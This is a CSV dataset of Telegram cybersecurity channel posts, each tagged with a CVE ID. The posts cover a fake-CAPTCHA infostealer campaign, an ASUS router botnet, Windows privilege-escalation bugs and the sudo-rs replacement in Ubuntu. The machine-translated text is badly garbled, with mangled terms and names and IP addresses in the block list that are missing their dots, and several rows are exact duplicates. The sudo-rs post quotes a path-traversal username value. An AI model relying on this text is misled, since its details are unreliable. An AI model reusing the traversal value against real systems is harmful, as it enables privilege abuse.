id,cve_id,channel_name,message,timestamp,message_url
1,CVE-2025-24201,positive_investing,"The most interesting news from the world of cybersecurity for the week Positive Technologies warned about an increase in the number of attacks through a fake Captchas by the company's analysts studied cyberhrosis for the IV quarter of 2024 and that private individuals became the victims of infostillers - malicious programs that collect information from the devices that they fall. The attackers are placed on malicious sites for a fake Captcha, for which it is supposedly necessary to insert data from the Boofer of the command line and activates the installation of the VPO to the victim’s device urgently update to update the iOS due to the critically dangerous vulnerability. CVE-2025-24201 was found in WebKit-a browser engine used in Safari and in all other Internet browsers created for iPhone and iPad. To protect against threat, users need to establish the latest update of the iOS operating system - 18.3.2. Reply from the regulator a request for whether the translation was executed under the influence of attackers if the law enforcement agencies will request information through the Central Bank of the Russian Federation. Maters, known as Eminem, (in violation of copyright and transportation of stolen property across the borders of the States in connection with the sale of unrelated compositions of the artist. Ex-colleagues of Strengja from Mathers Music Studio found that the incomplete tracks of the artist, on whom he still works, was also found there a list of unfinished songs taken from the same The Studio’s hard disk has established that the man was engaged in an illegal sale of intellectual property",2025-06-01 01:32:01.123694,https://t.me/positive_investing/1508
2,CVE-2023-39780,notlukatsky,"More than 9,000 ASUS routers are compromised by the new Botnet, called Ayysshush, which is also aimed at Cisco, D-Link and Linksys. The campaign was (Greynoise researchers in mid-March 2025, who believe that an unreliable APT can stand behind the harmful activity. The attacks combine the selection of accounting data for the entrance, bypassing the authentication and operation of old vulnerabilities for hacking the ASUS routers, including the RT-AC3100, RT-UC3200 and RT-UC3200 and RT-UC3200s and RT-Ax55. Firmware (SSH-Backdor. The attack is especially secretive and does not use malicious software, while the attackers also disconnect the journal and the Trend Micro Aiprotection function to avoid detection. Greynoise reports on the registration of only 30 malicious requests related to this campaign, nevertheless, nevertheless, to date, has been reported to 9,000 about 9,000 Infected ASUS routes, it also notes that the current campaign, apparently, intersects with the activities that Sekoia monitors (however, in this case, the attackers used the ASUS CVE-2021-32030. During the campaign, the attackers have aimed DVR and BMC controllers from D-Link, Linksys, Qnap and Araknis Networks. A malicious script was loaded and launched from the compromised system to third -party devices controlled by the attacker. CVE-2023-39780 for affected routers, although the exact accessibility time depends on the model. which should be added to the black list: 101.99.91151, 101.99.94173, 79.141.163179 and 111.90.146237.",2025-06-01 01:32:06.310993,https://t.me/notlukatsky/5173
3,CVE-2021-32030,notlukatsky,"More than 9,000 ASUS routers are compromised by the new Botnet, called Ayysshush, which is also aimed at Cisco, D-Link and Linksys. The campaign was (Greynoise researchers in mid-March 2025, who believe that an unreliable APT can stand behind the harmful activity. The attacks combine the selection of accounting data for the entrance, bypassing the authentication and operation of old vulnerabilities for hacking the ASUS routers, including the RT-AC3100, RT-UC3200 and RT-UC3200 and RT-UC3200s and RT-Ax55. Firmware (SSH-Backdor. The attack is especially secretive and does not use malicious software, while the attackers also disconnect the journal and the Trend Micro Aiprotection function to avoid detection. Greynoise reports on the registration of only 30 malicious requests related to this campaign, nevertheless, nevertheless, to date, has been reported to 9,000 about 9,000 Infected ASUS routes, it also notes that the current campaign, apparently, intersects with the activities that Sekoia monitors (however, in this case, the attackers used the ASUS CVE-2021-32030. During the campaign, the attackers have aimed DVR and BMC controllers from D-Link, Linksys, Qnap and Araknis Networks. A malicious script was loaded and launched from the compromised system to third -party devices controlled by the attacker. CVE-2023-39780 for affected routers, although the exact accessibility time depends on the model. which should be added to the black list: 101.99.91151, 101.99.94173, 79.141.163179 and 111.90.146237.",2025-06-01 01:32:06.311622,https://t.me/notlukatsky/5173
4,CVE-2025-24252,cakescats_com,"Kotopiroki washed down their GitHub and finally begin to induce the instruments in the public. This is the first in the cycle about iOS and Forenzik - it was already filled, but it was assumed both in terms of software and handmade. In the part of Logarchive in iOS, its analysis, etc., a bunch of small status are also written, it seems like a clock that froze in the clock, or how much this or that event took place ... I will say more, I even had to carry out an upgrade to the gland to work, so that it would be normally possible and yes, I lay out a finished tool because I think that the most relevant - because It can affect whether the pain of the less freshest versions of iOS. The scriptor greatly simplifies life in the wilds of Logarchive when trying to search for traces of attacks precisely CVE-2025-24252 here about the attack itself a little more",2025-06-01 01:32:10.555409,https://t.me/cakescats_com/395
5,CVE-2025-21333,sycebrex,"The hostess of the Nasthab was poured by Proof of Concept to increase the excellence in Microsoft Windows Hyper-V NT Kernel Virtual Service Provider. An increase in lovelongs became possible due to vulnerability such as overflowing the heap. This is a component used to communicate between the host OS and container type virtual machines, such as Windows Sandbox and Microsoft Defender Application Guard. It is not in the traditional environment of Hyper-V virtual machines. While the traditional Hyper-V virtual machines have a strict border between the host and the guest for insulation, a container type, such as MDAG, imitate that they work at the host. The Hyper-V NT Kernel Integration VSP driver has functionality, which just allows this imitation of large virtual monsters in danger. But the sandbox .... Interestingly, quickly this bug is integrated into Malvara? A (",2025-06-01 01:32:24.534731,https://t.me/sycebrex/400
6,CVE-2025-21293,sycebrex,"It seems that the news is waiting for us, it seems that news is waiting for us about a new, actively operated vulnerability - an increase in privileges in AD. Oneolfrost from Denmark posted a detailed description of the operation of vulnerability (vulnerability was found in September 2024, closed in January 2025. The vulnerability was in the Network Configuration Operators, the group in AD is built -in securities. This group is needed to grant limited networks of the network configuration users without full administrative rights, and, as It turned out that I had excessive permits for the sensitive sections of the registry. The user code through the loading of malicious DLLs. After loading and registration, these DLLs are performed with System level privileges. Very convenient! Okay, if you discard all the hikhanki and hakhonki, then this bug, unfortunately, is most likely already exposed and quite actively. It looks like a rather convenient tool without interaction with memory, etc. Yes, and the code is available for its operation. So, unfortunately, we will hear the new Ransovar-Vypery stories the Sabastian Bir reception itself from Denmark, works on the Retest Security Pentor. And he found vulnerability during pentest. A very cool find wanted to see how much they could offer Zerodium for such a find, but, suddenly, they removed the price list from the public. Really the trends of the new administration?",2025-06-01 01:32:24.537244,https://t.me/sycebrex/382
7,CVE-2023-42456,tech_b0lt_Genona,"Here in Ubuntu they decided to drag an analogue of `sudo`, which is written at Rust in general, because 1. The analogue will be included in the supply of a popular distribution 2. This is the first step of popularizing the new generation of utilities, which can replace old with“ historical problems ”, I personally do not move to any fashionable“ Blazingfast ”, the utilities until they appear until they appear in repositories of the distributions that I use. So we will see. `` `Canonical is intended to use the SUDO utility, developed by the SUDO-RS project and written in RUST, in the default Autumn issue of Ubuntu 25.10. In March, a similar decision was made regarding the replacement of GNU Coreutils utilities with Uutils tools. At the stage of consideration, there are initiatives to replace ZLIB and NTPD with ZLIB -R and NTPD-RS, as well as the use of Sequoia instead of GNUPG in the APT package manager. In Sudo-RS, if possible, compatibility with the classic SUDO and SU utilities, which allows the use of Sudo-SS as a transparent replacement of SUDO in most use scenarios. For users who do not want to switch to Uutils and Sudo-RS, the Ubuntu 25.10 will be provided for a rollback to classic options for systemic utilities Coreutils and Sudo. . . . Replacing the system components is carried out as part of the initiative to improve the quality of the systemic environment through the supply of programs originally developed with an eye on safety, reliability and correctness. The supply of utilities written in the Rust language will make it possible to reduce the risk of errors when working with memory, such as an appeal to the memory area after its release and exit by the buffer border. If the experiment is recognized as successful, then the RUST utilities will be involved by default in the Ubuntu LTS vehicle 26.04.``` 'In Ubuntu 25.10, it was decided to use the SUDO analogue, written on Rust, the proper use of Rust will allow you to close part of the problems. Here are examples of CVE related to `sudo`-CVE-2019-18634-receiving ROOT through overflow (-CVE-2021-3156-getting ROOT through overflow (but` Sudo -rs` there is definitely a lot of work to ""run up"" with the logic of work. Here, for example, CVE-2023-42456 `` `` `` `` `` `` `` `` `` `` `` form Example We Cold Ader to the System Containing the Username `../../../../ Bin/CP`. Their Session Record File. Resolved Path of `/Bin/CP`. Login as a USer with A Constructed Username. Constructed Usernames ... The `Sudo -k` and` Sudo -k` Commands Can Run, Even Ifer Has No Sudo Access.``` Github of the project",2025-06-01 01:32:44.199935,https://t.me/tech_b0lt_Genona/5319
8,CVE-2019-18634,tech_b0lt_Genona,"Here in Ubuntu they decided to drag an analogue of `sudo`, which is written at Rust in general, because 1. The analogue will be included in the supply of a popular distribution 2. This is the first step of popularizing the new generation of utilities, which can replace old with“ historical problems ”, I personally do not move to any fashionable“ Blazingfast ”, the utilities until they appear until they appear in repositories of the distributions that I use. So we will see. `` `Canonical is intended to use the SUDO utility, developed by the SUDO-RS project and written in RUST, in the default Autumn issue of Ubuntu 25.10. In March, a similar decision was made regarding the replacement of GNU Coreutils utilities with Uutils tools. At the stage of consideration, there are initiatives to replace ZLIB and NTPD with ZLIB -R and NTPD-RS, as well as the use of Sequoia instead of GNUPG in the APT package manager. In Sudo-RS, if possible, compatibility with the classic SUDO and SU utilities, which allows the use of Sudo-SS as a transparent replacement of SUDO in most use scenarios. For users who do not want to switch to Uutils and Sudo-RS, the Ubuntu 25.10 will be provided for a rollback to classic options for systemic utilities Coreutils and Sudo. . . . Replacing the system components is carried out as part of the initiative to improve the quality of the systemic environment through the supply of programs originally developed with an eye on safety, reliability and correctness. The supply of utilities written in the Rust language will make it possible to reduce the risk of errors when working with memory, such as an appeal to the memory area after its release and exit by the buffer border. If the experiment is recognized as successful, then the RUST utilities will be involved by default in the Ubuntu LTS vehicle 26.04.``` 'In Ubuntu 25.10, it was decided to use the SUDO analogue, written on Rust, the proper use of Rust will allow you to close part of the problems. Here are examples of CVE related to `sudo`-CVE-2019-18634-receiving ROOT through overflow (-CVE-2021-3156-getting ROOT through overflow (but` Sudo -rs` there is definitely a lot of work to ""run up"" with the logic of work. Here, for example, CVE-2023-42456 `` `` `` `` `` `` `` `` `` `` `` form Example We Cold Ader to the System Containing the Username `../../../../ Bin/CP`. Their Session Record File. Resolved Path of `/Bin/CP`. Login as a USer with A Constructed Username. Constructed Usernames ... The `Sudo -k` and` Sudo -k` Commands Can Run, Even Ifer Has No Sudo Access.``` Github of the project",2025-06-01 01:32:44.200384,https://t.me/tech_b0lt_Genona/5319
9,CVE-2019-18634,tech_b0lt_Genona,"Here in Ubuntu they decided to drag an analogue of `sudo`, which is written at Rust in general, because 1. The analogue will be included in the supply of a popular distribution 2. This is the first step of popularizing the new generation of utilities, which can replace old with“ historical problems ”, I personally do not move to any fashionable“ Blazingfast ”, the utilities until they appear until they appear in repositories of the distributions that I use. So we will see. `` `Canonical is intended to use the SUDO utility, developed by the SUDO-RS project and written in RUST, in the default Autumn issue of Ubuntu 25.10. In March, a similar decision was made regarding the replacement of GNU Coreutils utilities with Uutils tools. At the stage of consideration, there are initiatives to replace ZLIB and NTPD with ZLIB -R and NTPD-RS, as well as the use of Sequoia instead of GNUPG in the APT package manager. In Sudo-RS, if possible, compatibility with the classic SUDO and SU utilities, which allows the use of Sudo-SS as a transparent replacement of SUDO in most use scenarios. For users who do not want to switch to Uutils and Sudo-RS, the Ubuntu 25.10 will be provided for a rollback to classic options for systemic utilities Coreutils and Sudo. . . . Replacing the system components is carried out as part of the initiative to improve the quality of the systemic environment through the supply of programs originally developed with an eye on safety, reliability and correctness. The supply of utilities written in the Rust language will make it possible to reduce the risk of errors when working with memory, such as an appeal to the memory area after its release and exit by the buffer border. If the experiment is recognized as successful, then the RUST utilities will be involved by default in the Ubuntu LTS vehicle 26.04.``` 'In Ubuntu 25.10, it was decided to use the SUDO analogue, written on Rust, the proper use of Rust will allow you to close part of the problems. Here are examples of CVE related to `sudo`-CVE-2019-18634-receiving ROOT through overflow (-CVE-2021-3156-getting ROOT through overflow (but` Sudo -rs` there is definitely a lot of work to ""run up"" with the logic of work. Here, for example, CVE-2023-42456 `` `` `` `` `` `` `` `` `` `` `` form Example We Cold Ader to the System Containing the Username `../../../../ Bin/CP`. Their Session Record File. Resolved Path of `/Bin/CP`. Login as a USer with A Constructed Username. Constructed Usernames ... The `Sudo -k` and` Sudo -k` Commands Can Run, Even Ifer Has No Sudo Access.``` Github of the project",2025-06-01 01:32:44.200403,https://t.me/tech_b0lt_Genona/5319
10,CVE-2021-3156,tech_b0lt_Genona,"Here in Ubuntu they decided to drag an analogue of `sudo`, which is written at Rust in general, because 1. The analogue will be included in the supply of a popular distribution 2. This is the first step of popularizing the new generation of utilities, which can replace old with“ historical problems ”, I personally do not move to any fashionable“ Blazingfast ”, the utilities until they appear until they appear in repositories of the distributions that I use. So we will see. `` `Canonical is intended to use the SUDO utility, developed by the SUDO-RS project and written in RUST, in the default Autumn issue of Ubuntu 25.10. In March, a similar decision was made regarding the replacement of GNU Coreutils utilities with Uutils tools. At the stage of consideration, there are initiatives to replace ZLIB and NTPD with ZLIB -R and NTPD-RS, as well as the use of Sequoia instead of GNUPG in the APT package manager. In Sudo-RS, if possible, compatibility with the classic SUDO and SU utilities, which allows the use of Sudo-SS as a transparent replacement of SUDO in most use scenarios. For users who do not want to switch to Uutils and Sudo-RS, the Ubuntu 25.10 will be provided for a rollback to classic options for systemic utilities Coreutils and Sudo. . . . Replacing the system components is carried out as part of the initiative to improve the quality of the systemic environment through the supply of programs originally developed with an eye on safety, reliability and correctness. The supply of utilities written in the Rust language will make it possible to reduce the risk of errors when working with memory, such as an appeal to the memory area after its release and exit by the buffer border. If the experiment is recognized as successful, then the RUST utilities will be involved by default in the Ubuntu LTS vehicle 26.04.``` 'In Ubuntu 25.10, it was decided to use the SUDO analogue, written on Rust, the proper use of Rust will allow you to close part of the problems. Here are examples of CVE related to `sudo`-CVE-2019-18634-receiving ROOT through overflow (-CVE-2021-3156-getting ROOT through overflow (but` Sudo -rs` there is definitely a lot of work to ""run up"" with the logic of work. Here, for example, CVE-2023-42456 `` `` `` `` `` `` `` `` `` `` `` form Example We Cold Ader to the System Containing the Username `../../../../ Bin/CP`. Their Session Record File. Resolved Path of `/Bin/CP`. Login as a USer with A Constructed Username. Constructed Usernames ... The `Sudo -k` and` Sudo -k` Commands Can Run, Even Ifer Has No Sudo Access.``` Github of the project",2025-06-01 01:32:44.200413,https://t.me/tech_b0lt_Genona/5319
